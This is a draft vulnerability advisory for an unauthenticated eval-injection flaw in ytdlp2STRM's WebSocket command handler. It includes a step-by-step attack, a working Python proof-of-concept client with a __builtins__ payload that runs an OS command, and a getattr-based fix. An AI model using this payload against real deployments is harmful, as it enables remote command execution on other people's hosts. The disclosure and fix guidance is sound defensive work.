# GitHub Security Advisory — ytdlp2STRM Eval Injection (RCE)

> **Submission path:**  
> https://github.com/fe80Grau/ytdlp2STRM/security/advisories/new  
> ("Report a vulnerability" → Private Advisory → paste content below)  
> Check **"Request CVE ID"** on submission — GitHub is a CNA and will assign one.

---

## Advisory Draft

### Title
Eval Injection in WebSocket command handler enables unauthenticated Remote Code Execution

### Severity
**HIGH** — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — Base Score **8.1**

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | WebSocket endpoint reachable over LAN/internet when deployed via Docker |
| Attack Complexity | High | Requires constructing a Python `__builtins__` attribute-chain payload |
| Privileges Required | None | No authentication on the WebSocket endpoint |
| User Interaction | None | No victim action required |
| Confidentiality | High | Attacker achieves arbitrary OS command execution |
| Integrity | High | Files can be created, modified, or deleted |
| Availability | High | Service process can be terminated |

### Affected Versions
- **All versions ≤ 1.1.1** (current latest as of 2026-06-17)

### Patched Version
- None at time of disclosure

### CWE
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- **CWE-306**: Missing Authentication for Critical Function

---

## Description

`ytdlp2STRM` exposes a Flask-SocketIO web UI with a WebSocket event handler
(`execute_command`) that accepts arbitrary command strings from any network client.
The handler passes the string through `shlex.split()` and spawns a subprocess running
`cli.py`. The `--media` / `-m` argument in that subprocess is read unvalidated into the
variable `method`, which is then injected directly into a Python `eval()` call:

```python
# cli.py  line 65
r = eval("{}.{}.{}".format("plugins", method, "to_strm"))(*params)
```

An attacker can craft a value for `method` that embeds a Python expression leveraging
the module's `__builtins__` global to execute arbitrary OS commands. The `#` character
is a valid Python comment inside `eval()`, making it possible to suppress the trailing
`.to_strm` fragment and avoid an `AttributeError` that would otherwise prevent execution.

### Root Cause

1. **No authentication** on the WebSocket endpoint (`cors_allowed_origins="*"`).
2. The `sanitize()` utility present in `utils/sanitize.py` is **not applied** to the
   `--media` argument before it reaches `eval()`.
3. `eval()` is used for plugin dispatch where `getattr()` would be sufficient and safe.

### Attack Vector (step-by-step)

**Prerequisites:** The web UI port is reachable from the attacker's host.  
This is the default when using the official `docker-compose.yml`, which maps `5005:5000`.

```
1. Attacker connects to ws://<host>:5005/  (no credentials required)

2. Attacker emits WebSocket event:
     event:   "execute_command"
     payload: "python cli.py -m \"youtube.__class__.__init__.__globals__['__builtins__'].eval('__import__(\\\"os\\\").system(\\\"id\\\")') #\" -p dummy"

3. ui/ui.py:handle_command() tokenises the string with shlex.split() and calls
     Popen(["python", "-u", "cli.py", "-m", "<payload>", "-p", "dummy"], ...)

4. cli.py:main() sets  method = "<payload>"  (no sanitisation)

5. eval() receives:
     plugins.youtube.__class__.__init__.__globals__['__builtins__'].eval(
         '__import__("os").system("id")'
     ) #.to_strm
                                                       ^-- Python comment, ignored

6. os.system("id") executes in the server process.
   Output is streamed back to the attacker over the WebSocket.
```

### Impact

Any client that can reach the web UI port — including any host on the same LAN when
deployed with Docker — can execute arbitrary operating system commands as the user
running `ytdlp2STRM` **without authentication**. This gives full read/write access to
the host filesystem (via Docker volume mounts), the ability to exfiltrate credentials
stored in the application's config files, and the ability to pivot to other services
on the network.

---

## Proof of Concept

> Provided for vendor verification only. Please do not redistribute.

```python
import socketio

sio = socketio.Client()

TARGET = "http://localhost:5005"   # adjust to target host

PAYLOAD = (
    "python cli.py "
    "-m \"youtube.__class__.__init__.__globals__"
    "['__builtins__'].eval('__import__(\\\"os\\\").system(\\\"id\\\")') #\" "
    "-p dummy"
)

@sio.event
def command_output(data):
    print("[output]", data)

@sio.event
def connect():
    sio.emit("execute_command", PAYLOAD)

sio.connect(TARGET)
sio.wait()
```

Expected output: the result of `id` (or any other command) printed to the attacker's
terminal via the WebSocket `command_output` event.

---

## Recommended Fix

Replace the `eval()` dispatch with `getattr()`. This resolves the injection completely
and requires only a one-line change:

```python
# cli.py — BEFORE (vulnerable)
r = eval("{}.{}.{}".format("plugins", method, "to_strm"))(*params)

# cli.py — AFTER (safe)
plugin_module = getattr(plugins, method, None)
if plugin_module is None or not hasattr(plugin_module, "to_strm"):
    raise ValueError(f"Unknown plugin: {method!r}")
r = plugin_module.to_strm(*params)
```

Additionally recommended:

1. **Add authentication** to the WebSocket endpoint (token / session check in
   `@socketio.on('execute_command')`).
2. **Allowlist** the `method` value against the known plugin names loaded in
   `config/plugins.py` before dispatching.
3. Apply `utils/sanitize.py` or an explicit allowlist to all CLI arguments that
   are constructed from UI input.

---

## Workarounds (until a patch is available)

- Bind the web UI to `127.0.0.1` only (not `0.0.0.0`) if remote access is not needed.
- Add a reverse proxy (nginx) with HTTP Basic Auth in front of the Flask application.
- Use Docker network isolation: remove the `ports:` mapping and access via an internal
  Docker network only.
- Disable the web UI entirely and use cron-only mode.

---

## Timeline

| Date | Event |
|------|-------|
| 2026-06-17 | Vulnerability discovered via static analysis (VulnScanner / AST eval-injection rule) |
| 2026-06-17 | Private advisory submitted to maintainer via GitHub Security Advisory |
| 2026-06-17 + 90 days | Planned public disclosure date (2026-09-15), subject to patch availability |

---

## Reporter

Discovered during white-hat static analysis of public OSS repositories.  
Contact: doromajin.kiri@gmail.com

---

## References

- [CWE-95: Eval Injection](https://cwe.mitre.org/data/definitions/95.html)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Python `eval()` security considerations](https://docs.python.org/3/library/functions.html#eval)
